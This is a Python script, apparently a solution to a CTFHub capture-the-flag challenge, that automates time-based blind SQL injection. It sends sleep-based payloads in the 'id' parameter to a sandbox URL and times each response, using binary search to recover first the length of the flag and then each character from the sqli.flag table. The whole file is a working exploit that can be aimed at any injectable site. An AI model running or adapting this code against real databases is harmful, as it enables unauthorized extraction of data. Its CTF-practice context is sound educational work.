import requests
import time


def guess_number(url, num_guess_payload, inter_time):
    start = 0  # use for length's start
    end = 100  # use for length's end
    while 1:
        payload = '''?id=1 and if(({})>{},sleep({}),1)#'''\
                            .format(num_guess_payload, (start + end) // 2, inter_time)
        (start, end) = change_start_end(url + payload, inter_time, start, end)
        if start == end:
            print("number={}".format(start))
            break
    return start


def guess_name(url, num_guess_payload, name_guess_payload, inter_time):
    length = guess_number(url, num_guess_payload, inter_time)
    s = ""
    for i in range(length):
        start = 32  # use for ascii's start
        end = 126  # use for ascii's end
        while 1:
            payload = '''?id=1 and if(ascii(substr(({}),{},1))>{},sleep({}),1)#'''\
                                .format(name_guess_payload, i + 1, (start + end) // 2, inter_time)
            (start, end) = change_start_end(url + payload, inter_time, start, end)
            if start == end:
                s += chr(start)
                break
        print(s)


def change_start_end(url_payload, inter_time, start, end):
    time_start = time.time()
    requests.get(url_payload)
    time_end = time.time()
    if time_end - time_start < inter_time:
        end = (start + end) // 2
    else:
        start = (start + end) // 2 + 1
    return start, end


if __name__ == "__main__":
    Url = "http://challenge-dd26a298cf236e9b.sandbox.ctfhub.com:10080/"
    Num_guess_payload = '''(select length(flag) from sqli.flag)'''
    Name_guess_payload = '''(select flag from sqli.flag)'''
    Inter_time = 1  # second(s)
    guess_name(Url, Num_guess_payload, Name_guess_payload, Inter_time)
